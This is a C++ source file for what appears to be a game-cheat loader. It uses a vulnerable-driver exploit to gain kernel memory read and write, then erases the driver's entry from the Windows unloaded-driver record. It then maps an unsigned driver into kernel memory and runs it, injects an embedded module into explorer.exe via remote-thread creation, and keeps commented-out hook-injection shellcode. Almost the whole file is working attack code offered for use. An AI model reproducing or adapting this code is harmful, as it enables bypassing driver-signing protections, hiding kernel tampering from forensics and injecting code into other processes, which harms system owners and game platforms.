	0x7D, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x3F, 0x78, 0x6D,
	0x6C, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x27, 0x31,
	0x2E, 0x30, 0x27, 0x20, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67,
	0x3D, 0x27, 0x55, 0x54, 0x46, 0x2D, 0x38, 0x27, 0x20, 0x73, 0x74, 0x61,
	0x6E, 0x64, 0x61, 0x6C, 0x6F, 0x6E, 0x65, 0x3D, 0x27, 0x79, 0x65, 0x73,
	0x27, 0x3F, 0x3E, 0x0D, 0x0A, 0x3C, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62,
	0x6C, 0x79, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3D, 0x27, 0x75, 0x72,
	0x6E, 0x3A, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2D, 0x6D, 0x69,
	0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2D, 0x63, 0x6F, 0x6D, 0x3A,
	0x61, 0x73, 0x6D, 0x2E, 0x76, 0x31, 0x27, 0x20, 0x6D, 0x61, 0x6E, 0x69,
	0x66, 0x65, 0x73, 0x74, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D,
	0x27, 0x31, 0x2E, 0x30, 0x27, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x74,
	0x72, 0x75, 0x73, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x20, 0x78, 0x6D, 0x6C,
	0x6E, 0x73, 0x3D, 0x22, 0x75, 0x72, 0x6E, 0x3A, 0x73, 0x63, 0x68, 0x65,
	0x6D, 0x61, 0x73, 0x2D, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66,
	0x74, 0x2D, 0x63, 0x6F, 0x6D, 0x3A, 0x61, 0x73, 0x6D, 0x2E, 0x76, 0x33,
	0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x65, 0x63,
	0x75, 0x72, 0x69, 0x74, 0x79, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64,
	0x50, 0x72, 0x69, 0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x73, 0x3E, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x72, 0x65,
	0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x45, 0x78, 0x65, 0x63, 0x75,
	0x74, 0x69, 0x6F, 0x6E, 0x4C, 0x65, 0x76, 0x65, 0x6C, 0x20, 0x6C, 0x65,
	0x76, 0x65, 0x6C, 0x3D, 0x27, 0x61, 0x73, 0x49, 0x6E, 0x76, 0x6F, 0x6B,
	0x65, 0x72, 0x27, 0x20, 0x75, 0x69, 0x41, 0x63, 0x63, 0x65, 0x73, 0x73,
	0x3D, 0x27, 0x66, 0x61, 0x6C, 0x73, 0x65, 0x27, 0x20, 0x2F, 0x3E, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x72, 0x65, 0x71,
	0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6C,
	0x65, 0x67, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C,
	0x2F, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x3E, 0x0D, 0x0A,
	0x20, 0x20, 0x3C, 0x2F, 0x74, 0x72, 0x75, 0x73, 0x74, 0x49, 0x6E, 0x66,
	0x6F, 0x3E, 0x0D, 0x0A, 0x3C, 0x2F, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62,
	0x6C, 0x79, 0x3E, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00
};

using namespace dolboeb;

constexpr auto STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

constexpr auto SystemModuleInformation = 11;
constexpr auto SystemHandleInformation = 16;
constexpr auto SystemExtendedHandleInformation = 64;

typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

std::vector<char> read_all_bytes(char const* filename)
{
	std::ifstream ifs(filename, std::ios::binary | std::ios::ate);
	std::ifstream::pos_type pos = ifs.tellg();

	std::vector<char>  result(pos);

	ifs.seekg(0, std::ios::beg);
	ifs.read(&result[0], pos);

	return result;
}

void hexdump(void* ptr, int buflen)
{
	unsigned char* buf = (unsigned char*)ptr;
	int i, j;
	for (i = 0; i < buflen; i += 16) {
		printf("%p: ", buf + i);
		for (j = 0; j < 16; j++)
			if (i + j < buflen)
				printf("%02x ", buf[i + j]);
			else
				printf("   ");
		printf(" ");
		for (j = 0; j < 16; j++)
			if (i + j < buflen)
				printf("%c", isprint(buf[i + j]) ? buf[i + j] : '.');
		printf("\n");
	}
}

class c_driver
{
private:
	shared::nt::NtQueryAuxiliaryCounterFrequency_t syscall_fn;

	void send_command(shared::nt::COMMAND_BUFFER &cmd_buffer)
	{
		syscall_fn(&cmd_buffer);
	}

public:
	c_driver() : syscall_fn(nullptr)
	{
		syscall_fn = ::li::detail::lazy_function
		<
			LAZY_IMPORTER_KHASH("NtQueryAuxiliaryCounterFrequency"), 
			shared::nt::NtQueryAuxiliaryCounterFrequency_t
		>().get();
	}

	bool is_mapped()
	{
		return false;

		shared::nt::COMMAND_BUFFER cmd;

		cmd.m_command_id = shared::nt::IS_VALID;
		memset(&cmd.m_data, 0, sizeof(cmd.m_data));
		cmd.m_status = FALSE;

		send_command(cmd);

		return cmd.m_status == TRUE;
	}

	bool allocate_user_memory(uint64_t process_id, uint64_t& address, size_t size)
	{
		shared::nt::COMMAND_BUFFER cmd;

		cmd.m_command_id = shared::nt::ALLOCATE_MEMORY;
		memset(&cmd.m_data, 0, sizeof(cmd.m_data));

		cmd.m_data[2] = size;
		cmd.m_data[3] = process_id;
		cmd.m_status = FALSE;

		send_command(cmd);

		const bool result = cmd.m_status == TRUE;

		if (result)
		{
			address = cmd.m_data[1];
		}

		return result;
	}

	bool allocate_krnl_memory(uint64_t& address, size_t size)
	{
		shared::nt::COMMAND_BUFFER cmd;

		cmd.m_command_id = shared::nt::ALLOCATE_KRNL_MEMORY;
		memset(&cmd.m_data, 0, sizeof(cmd.m_data));

		cmd.m_data[2] = size;
		//cmd.m_data[3] = process_id;
		//cmd.m_data[4] = cur_proc_id;
		cmd.m_status = FALSE;

		send_command(cmd);

		const bool result = cmd.m_status == TRUE;

		if (result)
		{
			address = cmd.m_data[1];
		}

		return result;
	}

	bool expose_mem_to_process(uint64_t process_id, uint64_t address, size_t size)
	{
		shared::nt::COMMAND_BUFFER cmd;

		cmd.m_command_id = shared::nt::EXPOSE_MEM_TO_PROCESS;
		memset(&cmd.m_data, 0, sizeof(cmd.m_data));

		cmd.m_data[1] = address;
		cmd.m_data[2] = size;
		cmd.m_data[3] = process_id;
		cmd.m_status = FALSE;

		send_command(cmd);

		const bool result = cmd.m_status == TRUE;

		if (result)
		{
			address = cmd.m_data[1];
		}

		return result;
	}
};

typedef struct _main_struct
{
	int status;
	uintptr_t fn_dll_main;
	HINSTANCE dll_base;
} main_struct;

template <typename destt, typename srct>
void __memcpy(destt Destination, srct Source, SIZE_T Count) {
	__movsb((PBYTE)Destination, (BYTE*)Source, Count);
}

DWORD find_process_id(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}

#define RELOC_FLAG32(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_HIGHLOW)
#define RELOC_FLAG64(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_DIR64)

#ifdef _WIN64
#define RELOC_FLAG RELOC_FLAG64
#else
#define RELOC_FLAG RELOC_FLAG32
#endif

enum e_gametype
{
	UnrealWindow
};

struct mmap_data_t
{
	uint64_t m_address;
	uint64_t m_entrypoint;
	uint64_t m_gametype;
};

namespace std
{
	__forceinline vector<string> split(const string& str, char delimetr)
	{
		auto result = vector<string>();
		size_t previous = 0;
		auto current = str.find(delimetr);
		while (current != string::npos) {
			result.push_back(str.substr(previous, current - previous));
			previous = current + 1;
			current = str.find(delimetr, previous);
		}
		result.push_back(str.substr(previous, current - previous));
		return result;
	}
}

namespace arg
{
	constexpr int self = 0;
	int driver = 0;
	int attachment = 0;
	std::string WindowName = std::string();
	std::string WindowClassName = std::string();


	int parse(int argc, char** argv)
	{
		for (int i = 1; i < argc; i++)
		{
			if (strcmp(&(argv[i])[strlen(argv[i]) - 4], ".dll") == 0) {
				arg::attachment = i;
				if (arg::driver)
					break;
				continue;
			}
			arg::driver = i;
		}

		if (!arg::driver && !arg::attachment) {
			std::cout << "Gandon faily videly i dragNdropni!!!!!!!" << std::endl;
			system("pause");
			return 0;
		}

		if (!arg::driver) {
			std::cout << "druver gde???" << std::endl;
			system("pause");
			return 0;
		}

		if (!arg::attachment) {
			std::cout << "A SHO KUKANIT NE NADO? A YA HOCHU!!!!" << std::endl;
			system("pause");
			return 0;
		}

		auto Exename = std::split(argv[0], '\\').back();

		auto Names = std::split(Exename.substr(0, Exename.length() - 4), '.');
		WindowClassName = Names[0];
		if (Names.size() > 1)
			WindowName = Names[1];

		return 1;
	}
}//UnityPlayer.EscapeFromTarkov


int main(int argc, char** argv)
{
	if (!arg::parse(argc, argv))
		return 0;

	LI_FN(LoadLibraryA).get()("user32.dll");

	c_driver driver;

	if (!driver.is_mapped())
	{
		util::logger::info("Starting...");

		util::grant_privileges({ L"SeDebugPrivilege",  L"SeLoadDriverPrivilege" });

		i_exploit* my_exploit = new exploit::c_phymem();

		if (!bootstrap::startup(my_exploit)) {
			util::logger::error("Unable to initialize");
			return EXIT_FAILURE;
		}

		c_manager manager(my_exploit);
		manager.init_exploit();

		if (!dolboeb::executor::startup(manager))
		{
			util::logger::error("Unable to start executor");
			bootstrap::cleanup(my_exploit);
			return EXIT_FAILURE;
		}

		//

		const auto rtl_copy = manager.m_utils->get_ntoskrnl_export("RtlCopyMemory");

		auto read_kernel_mem = [&](void* address, void* buffer, size_t size)
		{
			dolboeb::executor::exec(manager, [&](shared::dolboeb::handler_ctx_t ctx) -> void
				{
					reinterpret_cast<shared::ke::RtlCopyMemory_t>(rtl_copy)(buffer, address, size);
				});
		};

		auto write_kernel_mem = [&](void* address, void* buffer, size_t size)
		{
			dolboeb::executor::exec(manager, [&](shared::dolboeb::handler_ctx_t ctx) -> void
				{
					reinterpret_cast<shared::ke::RtlCopyMemory_t>(rtl_copy)(address, buffer, size);
				});
		};

		//
		// clean mmunloaded drivers
		//

		auto device_handle = manager.m_exploit->get_device_handle();

		ULONG buffer_size = 0;
		void* buffer = nullptr;

		NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

		while (status == STATUS_INFO_LENGTH_MISMATCH)
		{
			VirtualFree(buffer, 0, MEM_RELEASE);

			buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
			status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
		}

		if (!NT_SUCCESS(status) || buffer == 0)
		{
			if (buffer != 0)
				VirtualFree(buffer, 0, MEM_RELEASE);

			bootstrap::cleanup(my_exploit);
		}

		uint64_t object = 0;

		auto system_handle_inforamtion = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

		for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
		{
			const SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

			if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
				continue;

			if (current_system_handle.HandleValue == device_handle)
			{
				object = reinterpret_cast<uint64_t>(current_system_handle.Object);
				break;
			}
		}

		VirtualFree(buffer, 0, MEM_RELEASE);

		if (!object)
		{
			std::cout << "[mmcleanshit] fail object -> 0" << std::endl;
			bootstrap::cleanup(my_exploit);
			return 0;
		}

		std::cout << "[mmcleanshit] object -> " << std::hex << object << std::endl;

		uint64_t device_object = 0;

		read_kernel_mem(reinterpret_cast<void*>(object + 0x8), &device_object, sizeof(device_object));

		if (!device_object)
		{
			std::cout << "[mmcleanshit] fail device_object -> 0" << std::endl;
			bootstrap::cleanup(my_exploit);
			return 0;
		}

		std::cout << "[mmcleanshit] device_object -> " << std::hex << device_object << std::endl;

		uint64_t driver_object = 0;

		read_kernel_mem(reinterpret_cast<void*>(device_object + 0x8), &driver_object, sizeof(driver_object));

		if (!driver_object)
		{
			std::cout << "[mmcleanshit] fail driver_object -> 0" << std::endl;
			bootstrap::cleanup(my_exploit);
			return 0;
		}

		std::cout << "[mmcleanshit] driver_object -> " << std::hex << driver_object << std::endl;

		uint64_t driver_section = 0;

		read_kernel_mem(reinterpret_cast<void*>(driver_object + 0x28), &driver_section, sizeof(driver_section));

		if (!driver_section)
		{
			std::cout << "[mmcleanshit] fail driver_section -> 0" << std::endl;
			bootstrap::cleanup(my_exploit);
			return 0;
		}

		std::cout << "[mmcleanshit] driver_section -> " << std::hex << driver_section << std::endl;

		UNICODE_STRING us_driver_base_dll_name;
		memset(&us_driver_base_dll_name, 0, sizeof(us_driver_base_dll_name));

		read_kernel_mem(reinterpret_cast<void*>(driver_section + 0x58), &us_driver_base_dll_name, sizeof(us_driver_base_dll_name));

		if (us_driver_base_dll_name.Length == 0)
		{
			std::cout << "[mmcleanshit] failed to find driver name" << std::endl;
			bootstrap::cleanup(my_exploit);
			return 0;
		}

		//wchar_t* unloadedName = new wchar_t[(ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL];
		//memset(unloadedName, 0, us_driver_base_dll_name.Length + sizeof(wchar_t));

		//read_kernel_mem(us_driver_base_dll_name.Buffer, unloadedName, us_driver_base_dll_name.Length);

		us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver

		write_kernel_mem(reinterpret_cast<void*>(driver_section + 0x58), &us_driver_base_dll_name, sizeof(us_driver_base_dll_name));

		//std::wcout << unloadedName << std::endl;

		//
		// mapper
		//

		auto driver = read_all_bytes(argv[arg::driver]);

		auto image_nt_headers = reinterpret_cast<IMAGE_NT_HEADERS*>(reinterpret_cast<uintptr_t>(driver.data()) + reinterpret_cast<IMAGE_DOS_HEADER*>(driver.data())->e_lfanew);
		auto optional_header = &image_nt_headers->OptionalHeader;
		auto file_header = &image_nt_headers->FileHeader;

		//std::cout << std::hex << optional_header->SizeOfImage << std::endl;

		auto local_image = VirtualAlloc(nullptr, optional_header->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		//std::cout << std::hex << local_image << std::endl;

		const auto ex_allocate = manager.m_utils->get_ntoskrnl_export("ExAllocatePool");

		void* remote_image = nullptr;

		dolboeb::executor::exec(manager, [&](shared::dolboeb::handler_ctx_t ctx) -> void {
			remote_image = reinterpret_cast<shared::ke::ExAllocatePool_t>(ex_allocate)(shared::ke::NonPagedPoolExecute, optional_header->SizeOfImage);
			});

		//std::cout << std::hex << remote_image << std::endl;

		auto section_header = IMAGE_FIRST_SECTION(image_nt_headers);

		for (uint32_t i = 0; i != file_header->NumberOfSections; ++i, ++section_header)
		{
			if (section_header->SizeOfRawData)
			{
				memcpy
				(
					reinterpret_cast<void*>(reinterpret_cast<uintptr_t>(local_image) + section_header->VirtualAddress),
					reinterpret_cast<void*>(reinterpret_cast<uintptr_t>(driver.data()) + section_header->PointerToRawData),
					section_header->SizeOfRawData
				);
			}
		}

		dolboeb::executor::exec(manager, [&](shared::dolboeb::handler_ctx_t ctx) -> void {
			reinterpret_cast<shared::ke::RtlCopyMemory_t>(rtl_copy)(remote_image, local_image, optional_header->SizeOfImage);
			});

		auto entry_point = reinterpret_cast<uintptr_t>(remote_image) + optional_header->AddressOfEntryPoint;

		dolboeb::executor::exec(manager, [&](shared::dolboeb::handler_ctx_t ctx) -> void {
			reinterpret_cast<shared::ke::DriverEntry_t>(entry_point)(remote_image, reinterpret_cast<void*>(optional_header->SizeOfImage));
			});

		bootstrap::cleanup(my_exploit);
	}

	mmap_data_t mmap_data;

	//
	{
		auto dll_file = read_all_bytes(argv[arg::attachment]);

		auto image_nt_headers = reinterpret_cast<IMAGE_NT_HEADERS*>(reinterpret_cast<uintptr_t>(dll_file.data()) + reinterpret_cast<IMAGE_DOS_HEADER*>(dll_file.data())->e_lfanew);
		auto optional_header = &image_nt_headers->OptionalHeader;
		auto file_header = &image_nt_headers->FileHeader;

		auto current_proc_id = GetCurrentProcessId();

		uint64_t address = 0;
		driver.allocate_krnl_memory(address, 0x100000);
		driver.expose_mem_to_process(current_proc_id, address, 0x100000);

		std::cout << std::hex << address << std::endl;

		//hexdump(reinterpret_cast<void*>(address), 0x1000);

		auto section_header = IMAGE_FIRST_SECTION(image_nt_headers);

		for (uint32_t i = 0; i != file_header->NumberOfSections; ++i, ++section_header)
		{
			if (section_header->SizeOfRawData)
			{
				__memcpy
				(
					reinterpret_cast<void*>(address + section_header->VirtualAddress),
					reinterpret_cast<void*>(reinterpret_cast<uintptr_t>(dll_file.data()) + section_header->PointerToRawData),
					section_header->SizeOfRawData
				);
			}
		}

		auto LocationDelta = address - optional_header->ImageBase;

		if (LocationDelta)
		{
			if (optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
			{
				auto* pRelocData = reinterpret_cast<IMAGE_BASE_RELOCATION*>(address + optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

				while (pRelocData->VirtualAddress)
				{
					UINT AmountOfEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
					WORD* pRelativeInfo = reinterpret_cast<WORD*>(pRelocData + 1);

					for (UINT i = 0; i != AmountOfEntries; ++i, ++pRelativeInfo)
					{
						if (RELOC_FLAG(*pRelativeInfo))
						{
							UINT_PTR* pPatch = reinterpret_cast<UINT_PTR*>(address + pRelocData->VirtualAddress + ((*pRelativeInfo) & 0xFFF));
							*pPatch += LocationDelta;
						}
					}

					pRelocData = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<BYTE*>(pRelocData) + pRelocData->SizeOfBlock);
				}
			}
		}

		//ulong_t process_id = 0;
		//ulong_t thread_id = 0;

		//while (!process_id)
		//{
		//	thread_id = LI_FN(GetWindowThreadProcessId).get()(LI_FN(FindWindowW).get()(L"UnrealWindow", NULL), &process_id);
		//	LI_FN(Sleep).get()(20);
		//}

		//driver.expose_mem_to_process(process_id, address, 0x100000);

		////std::cout << process_id << std::endl;
		////std::cout << thread_id << std::endl;

		//BYTE remote_call_dll_main[92] =
		//{
		//	0x48, 0x83, 0xEC, 0x38, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24,
		//	0x20, 0x83, 0x38, 0x00, 0x75, 0x39, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48,
		//	0x8B, 0x40, 0x08, 0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B,
		//	0x48, 0x10, 0xFF, 0x54, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x00, 0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC
		//};

		//DWORD shell_data_offset = 0x6;

		//HMODULE nt_dll = LI_FN(LoadLibraryW).get()(L"ntdll.dll");

		//DWORD shell_size = sizeof(remote_call_dll_main) + sizeof(main_struct);

		//PVOID alloc_local = LI_FN(VirtualAlloc).get()(NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		//memcpy(alloc_local, &remote_call_dll_main, sizeof(remote_call_dll_main));
		//uintptr_t shell_data = address + sizeof(remote_call_dll_main);
		//*(uintptr_t*)((uintptr_t)alloc_local + shell_data_offset) = shell_data;
		//main_struct* main_data = (main_struct*)((uintptr_t)alloc_local + sizeof(remote_call_dll_main));
		//main_data->dll_base = (HINSTANCE)address;
		//main_data->fn_dll_main = address + optional_header->AddressOfEntryPoint;

		//__memcpy(reinterpret_cast<void*>(address), alloc_local, shell_size);

		//HHOOK h_hook = LI_FN(SetWindowsHookExW).get()(WH_GETMESSAGE, (HOOKPROC)reinterpret_cast<void*>(address), nt_dll, thread_id);

		//while (main_data->status != 2)
		//{
		//	LI_FN(PostThreadMessageW).get()(thread_id, WM_NULL, 0, 0);
		//	__memcpy((PVOID)main_data, (PVOID)shell_data, sizeof(main_struct));
		//	LI_FN(Sleep).get()(10);
		//}

		//LI_FN(UnhookWindowsHookEx).get()(h_hook);

		//LI_FN(VirtualFree).get()(alloc_local, 0, MEM_RELEASE);

		mmap_data.m_address = address;
		mmap_data.m_entrypoint = address + optional_header->AddressOfEntryPoint;
		mmap_data.m_gametype = UnrealWindow;
	}

	//

	//auto dwm_module = read_all_bytes("C:\\Users\\User\\Desktop\\221\\dwm\\x64\\Release\\nocrt.exe");

	auto image_nt_headers = reinterpret_cast<IMAGE_NT_HEADERS*>(reinterpret_cast<uintptr_t>(&explorer) + reinterpret_cast<IMAGE_DOS_HEADER*>(&explorer)->e_lfanew);
	auto optional_header = &image_nt_headers->OptionalHeader;
	auto file_header = &image_nt_headers->FileHeader;

	auto process_id = find_process_id(L"explorer.exe");

	auto handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);

	auto module_ptr = reinterpret_cast<uintptr_t>(VirtualAllocEx(handle, NULL, optional_header->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

	auto section_header = IMAGE_FIRST_SECTION(image_nt_headers);

	size_t number_of_written = 0;

	for (uint32_t i = 0; i != file_header->NumberOfSections; ++i, ++section_header)
	{
		if (section_header->SizeOfRawData)
		{
			WriteProcessMemory
			(
				handle,
				reinterpret_cast<void*>(module_ptr + section_header->VirtualAddress),
				reinterpret_cast<void*>(reinterpret_cast<uintptr_t>(&explorer) + section_header->PointerToRawData),
				section_header->SizeOfRawData,
				&number_of_written
			);
		}
	}

	WriteProcessMemory
	(
		handle,
		reinterpret_cast<void*>(module_ptr),
		&mmap_data,
		sizeof(mmap_data),
		&number_of_written
	);

	CreateRemoteThread(handle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(module_ptr + optional_header->AddressOfEntryPoint), reinterpret_cast<void*>(module_ptr), 0, nullptr);

	return EXIT_SUCCESS;
}
